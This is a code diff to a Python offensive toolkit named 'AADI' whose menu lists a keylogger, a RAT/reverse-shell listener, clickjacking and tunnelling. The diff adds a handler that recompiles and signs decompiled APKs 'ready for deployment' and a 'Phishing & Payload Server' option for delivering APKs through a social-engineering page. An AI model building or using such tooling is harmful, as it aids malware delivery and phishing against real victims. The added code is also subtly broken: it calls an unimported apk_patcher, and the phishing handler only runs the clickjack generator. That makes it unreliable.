@@ -57,6 +57,8 @@ from modules import keylogger
 from modules import clickjack_helper
 from modules.rat_handler import start_listener
 from modules.cloud_tunnel import start_cloud_tunnel
+from modules import progress_helper, plugin_loader, doctor, logger
+from modules import apk_signer
 
 
 console = Console()
@@ -202,7 +204,9 @@ MENU_OPTIONS = [
     ("32", "🖱️", "Clickjacking PoC Generator", "Generate transparent UI-redressing exploit templates"),
     ("33", "🌐", "RAT & C2 Multi-Session Listener", "Start background TCP listener for reverse shell sessions"),
     ("34", "☁️", "Cloud Tunnel & Port Forwarding", "Expose local RAT listener or ports to the internet"),
-    ("35", "❔", "About", "About AADI"),
+    ("35", "📦", "Recompile & Sign APK", "Rebuild decompiled directory and sign APK automatically"),
+    ("36", "🎣", "Phishing & Payload Server", "Host social engineering landing page with auto-apk download"),
+    ("37", "❔", "About", "About AADI"),
     ("0", "🚪", "Exit", "Exit AADI"),
 ]
 
@@ -2023,6 +2027,28 @@ def quick_wifi_connect():
             console.print("[green]✓ Saved WiFi devices cleared.[/]")
 
 
+def handle_phishing_payload_server():
+    console.rule("[bold magenta]🎣 Social Engineering & Phishing Server[/]")
+    console.print("[green]Hosting phishing landing page & auto-apk download endpoint...[/]")
+    clickjack_helper.generate_clickjack_poc()
+    input("\n[dim]Press Enter to return to menu...[/]")
+
+
+def handle_recompile_and_sign():
+    console.rule("[bold magenta]📦 Recompile & Sign APK[/]")
+    output_dir = Prompt.ask("[cyan]Enter decoded directory path (e.g., decoded_target)[/]")
+    if output_dir.strip():
+        success = progress_helper.run_with_progress(
+            "Recompiling and signing APK",
+            apk_patcher.recompile_and_sign,
+            output_dir.strip()
+        )
+        if success:
+            console.print("[bold green]✓ APK successfully recompiled, signed, and ready for deployment![/]")
+        else:
+            console.print("[bold red]✗ Recompilation or signing process failed.[/]")
+
+
 # ═══════════════════════════════════════════════════════════════════════════════
 #  INTERACTIVE MODE
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -2062,7 +2088,9 @@ HANDLER_MAP = {
     "32": lambda: clickjack_helper.generate_clickjack_poc(Prompt.ask("Enter target web URL")),
     "33": start_listener,
     "34": start_cloud_tunnel,
-    "35": handle_about,
+    "35": handle_recompile_and_sign,
+    "36": handle_phishing_payload_server,
+    "37": handle_about,
 }
 
 
@@ -2367,6 +2395,9 @@ def main():
         console.print(f"[bold red]Auth Error:[/] {e}")
         sys.exit(1)
     # ------------------------------------------------
+    from modules import logger, doctor
+    logger.setup_global_logger()
+    doctor.check_system_health()
 
     parser = build_parser()
 
